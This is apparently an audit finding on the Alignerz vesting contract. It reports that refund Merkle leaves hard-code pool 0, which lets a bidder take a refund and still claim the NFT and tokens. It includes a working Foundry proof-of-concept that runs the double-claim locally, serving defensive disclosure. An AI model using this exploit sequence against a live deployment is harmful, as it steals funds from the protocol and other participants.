# [000415] Refund tree hardcodes pool 0, enabling double-claim (refund plus NFT) and breaking per-pool refunds
  
  The refund path hard-codes `poolId = 0` into the Merkle leaf (https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L842-L848) and only toggles `claimedRefund[leaf]`. 

The bidder’s bid state is untouched (`bid.amount` stays >0) and the NFT claim guard is a separate mapping (`claimedNFT[leaf]`, `claimNFT` at https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L860-L878). If an address is included in both the refund root and any allocation root (especially pool 0 where the leaf is identical), they can first claim their stablecoin back and then still mint the NFT and vest tokens. 

That yields free tokens and a refund as nothing on-chain prevents the overlap beyond off-chain root hygiene.
Because the refund leaf always uses `poolId = 0`, any refund Merkle tree that encodes the real pool id (e.g., to support per-pool or extra refund pools) will make `claimRefund` impossible because proofs for `pool >0` will never validate. The `VestingPool.hasExtraRefund` flag is never referenced, so pool-specific refunds aren’t actually supported.

## POC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {Options} from "openzeppelin-foundry-upgrades/Options.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";

// PoC: A bidder included in both refund and allocation trees can claim a refund and still claim the NFT/tokens.
contract AlignerzRefundDoubleClaimPoC is Test {
    AlignerzVesting private vesting;
    Aligners26 private token;
    AlignerzNFT private nft;
    MockUSD private usdt;

    address private alice;

    function setUp() public {
        alice = makeAddr("alice");

        usdt = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        Options memory opts;
        opts.unsafeSkipAllChecks = true;

        address payable proxy = payable(
            Upgrades.deployUUPSProxy(
                "AlignerzVesting.sol",
                abi.encodeCall(AlignerzVesting.initialize, (address(nft))),
                opts
            )
        );
        vesting = AlignerzVesting(proxy);

        nft.addMinter(proxy);
        vesting.setTreasury(address(1));
    }

    function test_RefundAndAllocationOverlapLetsAliceDoubleClaim() public {
        uint256 projectId = 0;
        uint256 poolId = 0;
        uint256 bidAmount = 100 ether;
        uint256 totalAllocation = 200 ether;
        uint256 vestingPeriod = 30 days;

        // Fund and approve tokens for pool deposit.
        token.approve(address(vesting), totalAllocation);
        // Fund Alice with stablecoin for her bid.
        usdt.mint(address(this), bidAmount);
        usdt.transfer(alice, bidAmount);
        vm.startPrank(alice);
        usdt.approve(address(vesting), bidAmount);
        vm.stopPrank();

        // Owner launches project and creates a single pool.
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 10 days,
            bytes32(0),
            false
        );
        vesting.createPool(projectId, totalAllocation, 1 ether, false);

        // Alice places a bid into pool #0.
        vm.prank(alice);
        vesting.placeBid(projectId, bidAmount, vestingPeriod);

        // Close bidding with overlapping refund/allocation leaves (single-leaf Merkle trees; empty proofs).
        bytes32 leaf = keccak256(abi.encodePacked(alice, bidAmount, projectId, poolId));
        bytes32[] memory merkleRoots = new bytes32[](1);
        merkleRoots[0] = leaf;
        vesting.finalizeBids(projectId, leaf, merkleRoots, 30 days);

        // Alice first claims a refund.
        vm.prank(alice);
        vesting.claimRefund(projectId, bidAmount, new bytes32[](0));
        assertEq(usdt.balanceOf(alice), bidAmount, "refund not received");

        // She can still claim the NFT allocation using the same leaf.
        vm.prank(alice);
        uint256 nftId = vesting.claimNFT(projectId, poolId, bidAmount, new bytes32[](0));

        // Advance past vesting and claim tokens: Alice ends with both refund and vested tokens.
        vm.warp(block.timestamp + vestingPeriod + 1);
        uint256 tokenBalanceBefore = token.balanceOf(alice);
        vm.prank(alice);
        vesting.claimTokens(projectId, nftId);
        assertEq(token.balanceOf(alice), tokenBalanceBefore + bidAmount, "tokens not vested");
    }
}

```

## Impact
I’d rate this a High severity( High impact, Medium likelihood).

**Impact:** Direct funds loss—refunded bidders can still mint and vest tokens if their address appears in both trees (or if pool 0 overlaps), leading to double payouts. Also blocks legitimate refunds for pool-specific trees (availability failure). This squarely puts funds flow at risk.

**Likelihood:** Requires misconfigured Merkle trees (overlap or per-pool refund roots) or use of per-pool refund which are both plausible in normal operations but not guaranteed, hence medium rather than high

## Recommendation
Include `poolId` in `claimRefund` input and leaf hashing, and validate against the pool’s refund root. Don’t hard-code `poolId = 0`. If refunds are per-pool, store a refund root per pool (or a struct with both standard and refund roots) and use the appropriate root.

Enforce mutual exclusion on-chain. Once a refund is claimed, mark the bidder’s allocation as ineligible (e.g., zero out `bids[msg.sender].amount`, or set a refunded flag and require it to be false in `claimNFT`), and vice-versa (record NFT claim to block refund). If extra refund is intended, gate refund eligibility by `hasExtraRefund` on the pool and use the correct poolId when hashing, so winners cannot double-claim.

  